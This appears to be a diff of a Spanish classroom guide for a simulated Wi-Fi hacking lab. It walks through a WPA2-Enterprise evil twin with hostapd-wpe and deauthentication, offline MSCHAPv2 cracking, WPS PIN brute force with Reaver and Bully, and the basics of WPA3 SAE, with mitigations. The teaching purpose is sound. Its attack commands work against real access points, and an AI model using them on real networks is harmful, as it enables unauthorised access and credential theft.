 <span class="hljs-comment"># Intentar crackear el handshake con diccionario</span>
 aircrack-ng -w /usr/share/wordlists/rockyou.txt -b &lt;BSSID_ENT&gt; cap_ent-01.cap
@@ -1102,26 +1137,26 @@ cliente del lab no valida el certificado del servidor, entrega sus credenciales
 al gemelo. Después se crackean offline.</p>
 <p><code>hostapd-wpe</code> ya se instala con el laboratorio.</p>
 <p><strong>1. Configurar el AP gemelo</strong> (mismo SSID que el objetivo, en otra interfaz):</p>
-<pre class="hljs"><code><div>sudo cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/et.conf
-sudo sed -i <span class="hljs-string">'s/^interface=.*/interface=wlan1/'</span> /tmp/et.conf
-sudo sed -i <span class="hljs-string">'s/^ssid=.*/ssid=he_enterprise/'</span>   /tmp/et.conf
-sudo sed -i <span class="hljs-string">'s/^channel=.*/channel=3/'</span>         /tmp/et.conf
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> /etc/hostapd-wpe/hostapd-wpe.conf /tmp/et.conf
+<span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/^interface=.*/interface=wlan1/&#x27;</span> /tmp/et.conf
+<span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/^ssid=.*/ssid=he_enterprise/&#x27;</span>   /tmp/et.conf
+<span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/^channel=.*/channel=3/&#x27;</span>         /tmp/et.conf
 </div></code></pre>
 <p><strong>2. Arrancar el gemelo</strong> (deja wlan1 como AP; no hace falta monitor):</p>
-<pre class="hljs"><code><div>sudo hostapd-wpe /tmp/et.conf
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> hostapd-wpe /tmp/et.conf
 <span class="hljs-comment"># Queda a la escucha. Cada cliente que se autentique deja sus credenciales aquí.</span>
 </div></code></pre>
 <p><strong>3. Empujar al cliente hacia el gemelo</strong> desde otra terminal. Con deauth
 repetido, el cliente pierde el AP real y, al reasociar, puede elegir el gemelo:</p>
-<pre class="hljs"><code><div>sudo airmon-ng start wlan0 3
-sudo aireplay-ng -0 0 -a &lt;BSSID_ENT&gt; -c &lt;MAC_CLIENTE&gt; wlan0mon   <span class="hljs-comment"># Ctrl+C al capturar</span>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> airmon-ng start wlan0 3
+<span class="hljs-built_in">sudo</span> aireplay-ng -0 0 -a &lt;BSSID_ENT&gt; -c &lt;MAC_CLIENTE&gt; wlan0mon   <span class="hljs-comment"># Ctrl+C al capturar</span>
 </div></code></pre>
 <p><strong>4. Leer el reto/respuesta.</strong> Cuando el cliente se autentica contra el gemelo,
 <code>hostapd-wpe</code> imprime (y guarda en <code>/etc/hostapd-wpe/hostapd-wpe.log</code>) algo así:</p>
-<pre class="hljs"><code><div>username:    student_user@domain.lab
+<pre class="hljs"><code><div>username:    alumno@iesvjp.es
 challenge:   &lt;16 hex&gt;
 response:    &lt;48 hex&gt;
-jtr NETNTLM: student_user@domain.lab:$NETNTLM$&lt;challenge&gt;$&lt;response&gt;
+jtr NETNTLM: alumno@iesvjp.es:$NETNTLM$&lt;challenge&gt;$&lt;response&gt;
 hashcat:     &lt;challenge&gt;:&lt;response&gt;
 </div></code></pre>
 <p><strong>5. Crackear offline</strong> el MSCHAPv2 capturado, por cualquiera de las dos vías:</p>
@@ -1129,17 +1164,11 @@ hashcat:     &lt;challenge&gt;:&lt;response&gt;
 asleap -C &lt;challenge&gt; -R &lt;response&gt; -W /usr/share/wordlists/rockyou.txt
 
 <span class="hljs-comment"># o hashcat modo 5500 (NetNTLMv1 / MSCHAPv2)</span>
-<span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;challenge&gt;:&lt;response&gt;'</span> &gt; ent.hash
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;challenge&gt;:&lt;response&gt;&#x27;</span> &gt; ent.hash
 hashcat -m 5500 ent.hash /usr/share/wordlists/rockyou.txt
 </div></code></pre>
-<p><strong>Resultado esperado:</strong> la contraseña de <code>he_enterprise</code> es
-<code>EnterprisePass2026</code>, <strong>elegida a propósito fuera de <code>rockyou.txt</code></strong>. Con el
-diccionario de serie el crackeo <strong>falla</strong>: el objetivo del lab es <em>capturar</em> el
-reto/respuesta, no recuperar la clave. Para ver también el crackeo, añade la
-palabra a un diccionario propio:</p>
-<pre class="hljs"><code><div><span class="hljs-built_in">echo</span> <span class="hljs-string">'EnterprisePass2026'</span> &gt; /tmp/dic_ent.txt
-asleap -C &lt;challenge&gt; -R &lt;response&gt; -W /tmp/dic_ent.txt
-</div></code></pre>
+<p><strong>Resultado esperado:</strong> la contraseña de <code>alumno@iesvjp.es</code> en
+<code>he_enterprise</code> es <code>computer</code>, que está en <code>rockyou.txt</code>.</p>
 <p><strong>Recuperar el hash NT aunque la clave no esté en diccionario.</strong> La respuesta
 MSCHAPv2 se puede reducir a un solo DES (2^56) y obtener el hash NT con
 <code>chapcrack</code>, sea cual sea la contraseña. Ese hash sirve para <em>pass-the-hash</em>
@@ -1191,6 +1220,635 @@ fijada y nombre del servidor), identidad anónima y, mejor aún, <strong>EAP-TLS
 con certificado de cliente (sin contraseña que robar).</li>
 </ul>
 <hr>
+<h2 id="7-he-wps-wps-fuerza-bruta-online-del-pin">7. <code>he_wps</code> — WPS: fuerza bruta online del PIN</h2>
+<p>AP WPA2-PSK con <strong>WPS activo</strong> y PIN de AP habilitado. La clave WPA2 son 16
+caracteres aleatorios: no cae por diccionario, ni con el handshake ni con el
+PMKID. La lección es que <strong>WPS entrega la clave WPA2 sin necesidad de
+crackearla</strong>: basta con adivinar un PIN de 8 dígitos, y por un fallo de diseño
+del protocolo eso cuesta como mucho 11.000 intentos.</p>
+<h3 id="como-esta-montado-el-escenario">Cómo está montado el escenario</h3>
+<ul>
+<li><strong>PIN y clave aleatorios en cada despliegue.</strong> <code>despliegue.sh</code> los genera al
+arrancar y no quedan ni en el script ni en disco. Cada despliegue tiene una
+solución distinta (ver &quot;Consultar la solución&quot; más abajo).</li>
+<li><strong>PIN acotado para que quepa en una clase.</strong> La primera mitad está entre
+<code>0000</code> y <code>0099</code> y la segunda entre <code>000</code> y <code>099</code>, más el dígito de checksum.
+Reaver recorre los PINs en orden ascendente, así que el ataque necesita como
+mucho unos 200 intentos. En un router real serían hasta 11.000.</li>
+<li><strong>Watchdog anti-bloqueo.</strong> hostapd bloquea el PIN tras 3 fallos (ver el
+fundamento técnico). Un bucle en segundo plano (<code>LAB_WPS_WATCHDOG</code>) vuelve a
+fijar el PIN cada segundo con <code>hostapd_cli wps_ap_pin set</code>, lo que pone a
+cero los contadores de fallos y desbloquea el AP. Simula un router <strong>sin
+protección contra fuerza bruta</strong>, que es el caso real vulnerable.</li>
+<li><strong>Un cliente legítimo</strong> (<code>wlan_cli_wps</code>, <code>192.168.7.10</code>) hace ping al AP.
+Da realismo (la red &quot;tiene uso&quot; en airodump) y sirve para comprobar que el AP
+funciona. <strong>No hace falta para el ataque</strong>: WPS se ataca directamente contra
+el AP.</li>
+<li><strong>Usa el binario <code>hostapd-pmkid</code></strong>, por su parche 2 (no exigir ACK). Reaver
+y Bully se autentican y se asocian desde modo monitor, con el mismo problema
+que hcxdumptool y el fake auth de WEP (ver sección 5). Con el hostapd del
+sistema, la asociación nunca se completa. Efecto secundario: el AP también
+emite PMKID, pero con una clave aleatoria de 16 caracteres no sirve de nada.
+Es un buen contraste para el alumno.</li>
+</ul>
+<p>Al desplegar deben salir <code>[✓] AP he_wps con WPS activo (PIN de AP habilitado)</code>
+y <code>[✓] Cliente he_wps conectado</code>.</p>
+<h3 id="consultar-la-solucion-profesor">Consultar la solución (profesor)</h3>
+<pre class="hljs"><code><div>CLI=<span class="hljs-string">&quot;hostapd_cli -p /var/run/hostapd_wps -i wlan_ap_wps&quot;</span>
+<span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_ap_wps <span class="hljs-variable">$CLI</span> wps_ap_pin get              <span class="hljs-comment"># PIN del AP</span>
+<span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_ap_wps <span class="hljs-variable">$CLI</span> get_config | grep -E <span class="hljs-string">&#x27;wps_state|passphrase&#x27;</span>
+</div></code></pre>
+<p>Si <code>get_config</code> no muestra la passphrase, se obtiene en un solo intento con
+Reaver indicando el PIN: <code>reaver ... -p &lt;PIN&gt;</code> (ver apartado b).</p>
+<h3 id="a-detectar-aps-con-wps-wash">a) Detectar APs con WPS (<code>wash</code>)</h3>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> airmon-ng start wlan0 7             <span class="hljs-comment"># -&gt; wlan0mon</span>
+<span class="hljs-built_in">sudo</span> wash -i wlan0mon -c 7
+</div></code></pre>
+<p>Salida esperada (columnas principales):</p>
+<pre class="hljs"><code><div>BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
+--------------------------------------------------------------------------------
+02:00:00:00:15:00    7  -30  2.0  No             he_wps
+</div></code></pre>
+<ul>
+<li><code>WPS 2.0</code>: versión del protocolo que anuncia el AP en sus beacons.</li>
+<li><code>Lck No</code>: el PIN de AP <strong>no</strong> está bloqueado (<em>AP Setup Locked</em>). Si sale
+<code>Yes</code>, el AP rechaza los intentos de PIN.</li>
+</ul>
+<p><code>wash</code> lee el <strong>elemento WPS</strong> (<em>vendor specific</em>, OUI <code>00:50:F2</code>, tipo 4) que
+el AP incluye en beacons y <em>probe responses</em>. Desde fuera se sabe si WPS está
+activo y si está bloqueado sin enviar nada al AP.</p>
+<h3 id="b-metodo-1-reaver">b) Método 1 — Reaver</h3>
+<pre class="hljs"><code><div>BSSID=&lt;BSSID_WPS&gt;
+<span class="hljs-built_in">sudo</span> reaver -i wlan0mon -b <span class="hljs-variable">$BSSID</span> -c 7 -vv
+</div></code></pre>
+<p>Si Reaver pregunta <code>Restore previous session?</code>, responde <strong><code>n</code></strong> tras un
+redespliegue: el PIN ha cambiado y la sesión guardada no sirve.</p>
+<p>Salida típica de cada intento:</p>
+<pre class="hljs"><code><div>[+] Trying pin "00000000"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with 02:00:00:00:15:00 (ESSID: he_wps)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received WSC NACK            &lt;- primera mitad incorrecta
+[+] Sending WSC NACK
+</div></code></pre>
+<p>Cuando acierta la primera mitad, el AP responde con <strong>M5</strong> en lugar de NACK y
+el progreso <strong>salta a ~90,9 %</strong> (10.000 de 11.000 combinaciones descartadas de
+golpe). Es un momento muy didáctico para preguntar al alumno por qué salta.
+Al terminar:</p>
+<pre class="hljs"><code><div>[+] Pin cracked in 214 seconds
+[+] WPS PIN: '00350259'
+[+] WPA PSK: 'Xk3pQ9vT2mLr8WzA'
+[+] AP SSID: 'he_wps'
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> el PIN y la clave aleatorios del despliegue actual
+(compruébalos con los comandos de &quot;Consultar la solución&quot;).</p>
+<p>Con el PIN ya conocido, la clave se recupera en un solo intento. Esto
+demuestra que el PIN es una <strong>credencial permanente</strong>: aunque se cambie la
+clave WPA2, el PIN sigue entregando la nueva.</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> reaver -i wlan0mon -b <span class="hljs-variable">$BSSID</span> -c 7 -p &lt;PIN&gt; -vv
+</div></code></pre>
+<p>Opciones útiles si Reaver se atasca en <code>hwsim</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Opción</th>
+<th>Para qué</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-N</code></td>
+<td>No enviar NACKs propios (algunos APs se cuelgan con ellos)</td>
+</tr>
+<tr>
+<td><code>-d 0</code></td>
+<td>Sin espera entre intentos (por defecto 1 s)</td>
+</tr>
+<tr>
+<td><code>-L</code></td>
+<td>Ignorar el estado <em>Locked</em> del AP y seguir probando</td>
+</tr>
+<tr>
+<td><code>-T 1</code> / <code>-t 10</code></td>
+<td>Ajustar los timeouts de M5/M7 y de recepción</td>
+</tr>
+</tbody>
+</table>
+<h3 id="c-metodo-2-bully">c) Método 2 — Bully</h3>
+<p>Bully hace el mismo ataque y es una reimplementación independiente en C. Sirve
+para contrastar herramientas y para cuando Reaver falla con un AP concreto.</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> bully -b <span class="hljs-variable">$BSSID</span> -c 7 -S -A -v 3 wlan0mon
+</div></code></pre>
+<ul>
+<li><strong><code>-S</code> (secuencial) es imprescindible en este lab.</strong> Por defecto Bully
+prueba los PINs en <strong>orden aleatorio</strong>, y el acotado del PIN no acortaría
+nada. En un router real da igual: el caso medio es el mismo.</li>
+<li><strong><code>-A</code>: no comprobar los ACK.</strong> Bully espera ver la trama ACK de cada trama
+que inyecta. <code>mac80211_hwsim</code> simula el ACK internamente (como estado de
+transmisión) pero no emite tramas ACK al medio, así que Bully no las ve y se
+queda en timeouts.</li>
+<li><code>-v 3</code> muestra cada mensaje M1…M8. Bully indica el resultado de cada intento
+como <code>Pin1Bad</code> (falla la primera mitad, NACK tras M4) o <code>Pin2Bad</code> (falla la
+segunda, NACK tras M6).</li>
+</ul>
+<p>Al terminar:</p>
+<pre class="hljs"><code><div>[*] Pin is '00350259', key is 'Xk3pQ9vT2mLr8WzA'
+</div></code></pre>
+<p>Bully guarda la sesión en <code>~/.bully/</code>. Tras un redespliegue, borra el fichero
+de ese BSSID o usa <code>-F</code> para forzar que empiece de cero.</p>
+<h3 id="d-usar-la-clave-obtenida">d) Usar la clave obtenida</h3>
+<pre class="hljs"><code><div><span class="hljs-comment"># wlan1 en modo managed</span>
+wpa_passphrase he_wps <span class="hljs-string">&#x27;&lt;CLAVE&gt;&#x27;</span> &gt; wps.conf
+<span class="hljs-built_in">sudo</span> wpa_supplicant -B -D nl80211 -i wlan1 -c wps.conf
+<span class="hljs-built_in">sudo</span> ip addr add 192.168.7.50/24 dev wlan1
+ping -c 3 192.168.7.1
+</div></code></pre>
+<p>Alternativa sin conocer la clave, usando el PIN como <strong>registrador externo</strong>
+(es exactamente lo que hace Reaver, pero con <code>wpa_supplicant</code>):</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> wpa_supplicant -B -D nl80211 -i wlan1 -C /var/run/wpa_supplicant_alumno
+<span class="hljs-built_in">sudo</span> wpa_cli -p /var/run/wpa_supplicant_alumno -i wlan1 wps_reg &lt;BSSID_WPS&gt; &lt;PIN&gt;
+</div></code></pre>
+<h3 id="e-demostracion-de-la-defensa-el-bloqueo-del-pin">e) Demostración de la defensa: el bloqueo del PIN</h3>
+<p>Para mostrar que el bloqueo frena el ataque, detén el watchdog y relanza
+Reaver:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">sudo</span> pkill -f LAB_WPS_WATCHDOG
+<span class="hljs-built_in">sudo</span> reaver -i wlan0mon -b <span class="hljs-variable">$BSSID</span> -c 7 -vv
+</div></code></pre>
+<p>Tras 3 PINs incorrectos, Reaver muestra
+<code>WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking</code> y
+<code>wash</code> pasa a mostrar <code>Lck Yes</code>. Las esperas se duplican y, con 10 fallos
+seguidos, el bloqueo es indefinido. Con <code>-L</code> Reaver sigue enviando PINs, pero
+el AP los rechaza todos.</p>
+<p>Para desbloquear sin redesplegar:</p>
+<pre class="hljs"><code><div>CLI=<span class="hljs-string">&quot;hostapd_cli -p /var/run/hostapd_wps -i wlan_ap_wps&quot;</span>
+<span class="hljs-built_in">sudo</span> ip netns <span class="hljs-built_in">exec</span> ns_ap_wps sh -c <span class="hljs-string">&quot;<span class="hljs-variable">$CLI</span> wps_ap_pin set \$(<span class="hljs-variable">$CLI</span> wps_ap_pin get) 0&quot;</span>
+</div></code></pre>
+<p>Para volver a tener el watchdog, redespliega.</p>
+<h3 id="problemas-frecuentes">Problemas frecuentes</h3>
+<ul>
+<li><strong>Reaver se queda en <code>Sending authentication request</code> o
+<code>Failed to associate</code>.</strong> El AP no está corriendo con <code>hostapd-pmkid</code> o ese
+binario es anterior al parche del ACK. Comprueba qué binario usa:
+<code>ps -ef | grep 'wps/hostapd.conf'</code>.</li>
+<li><strong>El despliegue avisa de que WPS no está activo, o el AP no arranca.</strong> El
+binario <code>hostapd-pmkid</code> se compiló sin <code>CONFIG_WPS=y</code>. Añádelo al <code>.config</code>
+en <code>compila_hostapd_pmkid.sh</code> y recompila con <code>--force</code>.</li>
+<li><strong><code>wash</code> no muestra nada.</strong> La interfaz no está en monitor o no está en el
+canal 7. Usa <code>-c 7</code>.</li>
+<li><strong><code>wash</code> muestra <code>Lck Yes</code> sin haber parado el watchdog.</strong> El watchdog se ha
+caído. Compruébalo con <code>pgrep -f LAB_WPS_WATCHDOG</code> y redespliega.</li>
+<li><strong>Reaver alterna <code>Received M1</code> y timeouts sin avanzar.</strong> Prueba con <code>-N</code> y
+<code>-d 0</code>.</li>
+</ul>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<p><strong>Qué es WPS.</strong> <em>Wi-Fi Protected Setup</em> (Wi-Fi Alliance, 2006) se diseñó para
+que un usuario sin conocimientos conectara dispositivos sin teclear la clave
+WPA2. Tiene varios modos: botón (<em>PBC</em>), NFC y <strong>PIN</strong>. En el modo PIN de AP
+(<em>label</em>), el PIN de 8 dígitos suele estar impreso en la pegatina del router.
+Cualquiera que lo conozca puede actuar como <strong>registrador externo</strong> y pedirle
+al AP su configuración, que incluye la clave WPA2.</p>
+<p><strong>El protocolo (EAP-WSC).</strong> El intercambio va dentro de EAP, con el método
+expandido de la Wi-Fi Alliance (<em>WSC</em>). Se hace antes del 4-way y sin cifrado
+de enlace. Aquí el AP actúa como <em>Enrollee</em> (E) y el atacante como <em>Registrar</em>
+(R):</p>
+<table>
+<thead>
+<tr>
+<th>Mensaje</th>
+<th>Sentido</th>
+<th>Contenido relevante</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>M1</td>
+<td>AP → R</td>
+<td>Nonce N1, clave pública Diffie-Hellman <strong>PKE</strong> (1536 bits), datos del dispositivo</td>
+</tr>
+<tr>
+<td>M2</td>
+<td>R → AP</td>
+<td>Nonce N2, clave pública DH <strong>PKR</strong></td>
+</tr>
+<tr>
+<td>M3</td>
+<td>AP → R</td>
+<td><strong>E-Hash1, E-Hash2</strong> (compromisos del AP sobre las dos mitades del PIN)</td>
+</tr>
+<tr>
+<td>M4</td>
+<td>R → AP</td>
+<td><strong>R-Hash1, R-Hash2</strong> + R-S1 cifrado (prueba del registrador sobre la <strong>1.ª mitad</strong>)</td>
+</tr>
+<tr>
+<td>M5</td>
+<td>AP → R</td>
+<td>E-S1 cifrado (el AP revela su secreto de la 1.ª mitad)</td>
+</tr>
+<tr>
+<td>M6</td>
+<td>R → AP</td>
+<td>R-S2 cifrado (prueba sobre la <strong>2.ª mitad</strong>)</td>
+</tr>
+<tr>
+<td>M7</td>
+<td>AP → R</td>
+<td>E-S2 cifrado + <strong>configuración del AP: SSID y clave WPA2</strong></td>
+</tr>
+<tr>
+<td>M8</td>
+<td>R → AP</td>
+<td>Confirmación (y, opcionalmente, nueva configuración)</td>
+</tr>
+</tbody>
+</table>
+<p>Con el Diffie-Hellman de M1/M2 ambos derivan una clave de sesión de la que
+salen <strong>AuthKey</strong> (para los HMAC) y <strong>KeyWrapKey</strong> (para cifrar con AES los
+campos &quot;cifrados&quot;):</p>
+<pre class="hljs"><code><div>DHKey   = SHA-256(g^(ab) mod p)
+KDK     = HMAC-SHA256(DHKey, N1 ‖ MAC_Enrollee ‖ N2)
+AuthKey ‖ KeyWrapKey ‖ EMSK = KDF(KDK, "Wi-Fi Easy and Secure Key Derivation")
+</div></code></pre>
+<p><strong>El PIN se verifica en dos mitades:</strong></p>
+<pre class="hljs"><code><div>PSK1    = primeros 128 bits de HMAC-SHA256(AuthKey, PIN[1..4])
+PSK2    = primeros 128 bits de HMAC-SHA256(AuthKey, PIN[5..8])
+E-Hash1 = HMAC-SHA256(AuthKey, E-S1 ‖ PSK1 ‖ PKE ‖ PKR)
+E-Hash2 = HMAC-SHA256(AuthKey, E-S2 ‖ PSK2 ‖ PKE ‖ PKR)
+R-Hash1 / R-Hash2: lo mismo, con los secretos R-S1 / R-S2 del registrador
+</div></code></pre>
+<p>Es un esquema de <em>commitment</em> mutuo: cada parte se compromete con su
+conocimiento de cada mitad sin revelarla, y luego la va demostrando paso a
+paso, revelando sus nonces secretos (E-S1, R-S1…).</p>
+<p><strong>Qué se explota (Stefan Viehböck, diciembre de 2011):</strong></p>
+<ol>
+<li>
+<p><strong>El AP confirma cada mitad por separado.</strong> Tras recibir M4, el AP
+comprueba R-Hash1 con R-S1:</p>
+<ul>
+<li>Si la <strong>primera mitad</strong> es incorrecta, responde con <strong>NACK</strong> en lugar de
+M5.</li>
+<li>Si es correcta, envía M5. Con el M6 comprueba la <strong>segunda mitad</strong>: si
+falla, NACK en lugar de M7.</li>
+</ul>
+<p>El atacante sabe <strong>qué mitad ha fallado</strong>, así que ataca cada una por
+separado: 10^4 combinaciones para la primera y luego 10^3 para la segunda.</p>
+</li>
+<li>
+<p><strong>El último dígito es un checksum.</strong> El 8.º dígito se calcula a partir de
+los 7 anteriores, así que la segunda mitad solo tiene 3 dígitos libres:</p>
+<pre class="hljs"><code><div>checksum = (10 − (3·(d1+d3+d5+d7) + (d2+d4+d6)) mod 10) mod 10
+</div></code></pre>
+<p><strong>Espacio total: 10^4 + 10^3 = 11.000 intentos</strong> como máximo (5.500 de
+media), en lugar de 10^8. Por eso Reaver salta al 90,9 % cuando acierta
+la primera mitad.</p>
+</li>
+<li>
+<p><strong>El AP entrega la clave WPA2 en claro dentro del túnel.</strong> En M7 el AP
+envía su configuración (SSID, tipo de autenticación y <strong>Network Key</strong>)
+cifrada con KeyWrapKey, que el atacante conoce porque él mismo negoció el
+Diffie-Hellman. Acertar el PIN da la clave directamente, sea cual sea su
+robustez.</p>
+</li>
+<li>
+<p><strong>Es un ataque online, pero sin sustituto offline para el defensor.</strong> Cada
+intento requiere hablar con el AP (unos segundos por intento), pero no
+importa lo larga que sea la clave WPA2. A unos 2-10 s por intento, un
+router real cae en horas, no en años.</p>
+</li>
+</ol>
+<p><strong>Contraste con los escenarios anteriores:</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><code>he_wpa2</code> / <code>he_pmkid</code></th>
+<th><code>he_wps</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Qué se ataca</td>
+<td>La passphrase</td>
+<td>El PIN de WPS</td>
+</tr>
+<tr>
+<td>Tipo de ataque</td>
+<td>Offline (diccionario)</td>
+<td><strong>Online</strong> (interacción con el AP)</td>
+</tr>
+<tr>
+<td>Espacio de búsqueda</td>
+<td>Depende de la clave</td>
+<td><strong>11.000</strong>, fijo</td>
+</tr>
+<tr>
+<td>¿Importa la robustez de la clave WPA2?</td>
+<td>Sí, es la única defensa</td>
+<td><strong>No</strong></td>
+</tr>
+<tr>
+<td>Defensa del AP</td>
+<td>Ninguna posible (es offline)</td>
+<td>Bloqueo tras fallos / desactivar WPS</td>
+</tr>
+</tbody>
+</table>
+<p><strong>El bloqueo (<em>AP Setup Locked</em>) como defensa.</strong> Al ser online, el AP puede
+limitar los intentos. hostapd bloquea el PIN tras <strong>3 fallos</strong> durante
+60 s, duplica la espera cada 3 fallos más y, con <strong>10 fallos consecutivos</strong>,
+lo bloquea indefinidamente hasta que se reactiva a mano. El estado se anuncia
+en el elemento WPS (<code>AP Setup Locked</code>), y por eso <code>wash</code> lo muestra. Muchos
+routers de la época no implementaban ningún bloqueo, o lo hacían mal (se
+reiniciaba con un reboot o con un deauth flood). El watchdog del lab simula
+precisamente esos routers.</p>
+<p><strong>Pixie Dust (Dominique Bongard, 2014) — no reproducible en este lab.</strong> Es la
+evolución offline del ataque. Si el AP genera E-S1 y E-S2 de forma predecible
+(ceros, o un PRNG sembrado con la hora, como algunos chipsets de Ralink,
+Broadcom o Realtek), basta <strong>un solo intercambio M1–M3</strong>. Con PKE, PKR,
+AuthKey y los dos E-Hash, <code>pixiewps</code> prueba offline las 10^4 + 10^3
+combinaciones contra E-Hash1/E-Hash2 en segundos (<code>reaver -K</code>, <code>bully -d</code>).
+hostapd genera esos nonces con un RNG criptográfico, así que aquí Pixie Dust
+no funciona. Para enseñarlo habría que compilar un hostapd con E-S1 = E-S2 = 0.</p>
+<p><strong>Mitigación:</strong></p>
+<ul>
+<li><strong>Desactivar WPS</strong> (al menos el modo PIN) y comprobar con <code>wash</code> que de
+verdad está desactivado. Algunos firmwares lo siguen anunciando aunque la
+interfaz web diga lo contrario.</li>
+<li>Si no se puede desactivar: firmware con bloqueo tras fallos y PIN no
+impreso ni fijo.</li>
+<li>El modo botón (PBC) es menos grave (ventana de 2 minutos tras pulsarlo),
+pero también permite asociarse a quien esté cerca en ese momento.</li>
+<li><strong>WPA3 no define WPS.</strong> Su sustituto es <strong>Wi-Fi Easy Connect (DPP)</strong>, basado
+en claves públicas (código QR) en lugar de un PIN corto.</li>
+</ul>
+<hr>
+<h2 id="8-wpa3-tres-escenarios-he-wpa3-tm-he-wpa3-he-wpa3-dg">8. WPA3 — tres escenarios (<code>he_wpa3_tm</code>, <code>he_wpa3</code>, <code>he_wpa3_dg</code>)</h2>
+<p>WPA3-Personal sustituye el PSK de WPA2 por <strong>SAE</strong> (<em>Simultaneous
+Authentication of Equals</em>, también llamado <em>Dragonfly</em>). La idea para el alumno
+es clara: <strong>un WPA3 bien configurado no se crackea como WPA2</strong>. Lo que se ataca
+es lo que falla en la práctica: el <strong>modo de transición</strong> (que arrastra WPA2),
+el <strong>downgrade</strong> de clientes mal configurados y las <strong>contraseñas débiles</strong> (que
+solo caen por diccionario <em>online</em>, mucho más lento). Los tres canales libres
+usados son el 2, el 5 y el 10.</p>
+<h3 id="por-que-sae-no-es-crackeable-offline">Por qué SAE no es crackeable offline</h3>
+<p>En WPA2-PSK la PMK es <code>PBKDF2(passphrase, SSID)</code>: una función de la contraseña
+y nada más. Quien captura el handshake o el PMKID puede probar contraseñas
+offline, sin el AP. En SAE no:</p>
+<pre class="hljs"><code><div>Cada parte elige un número secreto aleatorio y hace "hunting and pecking":
+  deriva un punto P de la curva elíptica a partir de (passphrase, MAC_A, MAC_B).
+Commit:  A -&gt; B :  scalar_A, element_A      (y al revés)
+         (scalar y element se construyen con el secreto aleatorio y con P)
+Confirm: A -&gt; B :  HMAC sobre los commits, con una clave derivada del secreto
+                   compartido que solo se obtiene si ambos conocen la passphrase
+PMK = se deriva del secreto compartido (distinto en cada conexión)
+</div></code></pre>
+<ul>
+<li>El intercambio es un <strong>PAKE</strong> (intercambio de claves autenticado por
+contraseña): lo que viaja (scalars y elements) son puntos de curva elíptica
+enmascarados con números aleatorios de un solo uso. <strong>No es un verificador
+offline de la contraseña</strong>: sin el secreto aleatorio de la otra parte no se
+puede comprobar ninguna candidata contra lo capturado.</li>
+<li>Por eso capturar Commit/Confirm con airodump o hcxdumptool <strong>no sirve</strong>:
+<code>hcxpcapngtool</code> no escribe ninguna línea 22000 crackeable, y <code>aircrack-ng</code>
+dice <code>no valid WPA handshakes found</code>. Es el resultado que el alumno debe
+comprobar <strong>antes</strong> de pasar a los ataques que sí funcionan.</li>
+<li>SAE añade <strong>forward secrecy</strong> (cada sesión tiene su secreto; comprometer la
+contraseña no descifra capturas antiguas) y <strong>PMF obligatoria</strong> (los deauth
+falsificados no funcionan).</li>
+</ul>
+<h3 id="comprobar-el-soporte-sae">Comprobar el soporte SAE</h3>
+<p><code>despliegue.sh</code> ya lo verifica al arrancar (prueba <code>wpa_key_mgmt=SAE</code> contra una
+interfaz falsa). A mano:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;interface=x\ndriver=nl80211\nssid=p\nwpa=2\nwpa_key_mgmt=SAE\nrsn_pairwise=CCMP\nieee80211w=2\nsae_password=prueba123\n&#x27;</span> &gt; /tmp/sae.conf
+<span class="hljs-built_in">sudo</span> hostapd /tmp/sae.conf 2&gt;&amp;1 | grep -c <span class="hljs-string">&quot;invalid key_mgmt&quot;</span>   <span class="hljs-comment"># 0 = tiene SAE</span>
+</div></code></pre>
+<p>El Kali actual trae hostapd y wpa_supplicant con SAE. No hace falta recompilar
+nada: los tres escenarios usan el hostapd del sistema.</p>
+<hr>
+<h2 id="81-he-wpa3-tm-modo-de-transicion-wpa2wpa3-mixto">8.1 <code>he_wpa3_tm</code> — Modo de transición (WPA2/WPA3 mixto)</h2>
+<p>Es la configuración <strong>más común</strong> en routers domésticos: para no dejar fuera a
+los dispositivos antiguos, el AP acepta <strong>SAE y PSK con la misma contraseña</strong>.
+El resultado es que la red es tan débil como su parte WPA2.</p>
+<h3 id="como-esta-montado">Cómo está montado</h3>
+<ul>
+<li><code>wpa_key_mgmt=WPA-PSK SAE</code>: el AP anuncia los dos métodos en el RSN IE del
+beacon.</li>
+<li><code>ieee80211w=1</code> (PMF <strong>opcional</strong>): obligatoria rompería a los clientes WPA2.
+<code>sae_require_mfp=1</code> obliga a PMF solo a los clientes que entran por SAE.</li>
+<li><strong>Dos clientes</strong>: <code>wlan_cli3_tm</code> (WPA3/SAE + PMF) y <code>wlan_cli2_tm</code>
+(WPA2-PSK, sin PMF), el &quot;dispositivo antiguo&quot;.</li>
+</ul>
+<p>Al desplegar deben salir los dos <code>[✓] Cliente he_wpa3_tm ...</code>.</p>
+<h3 id="a-atacar-la-parte-wpa2-lo-que-funciona">a) Atacar la parte WPA2 (lo que funciona)</h3>
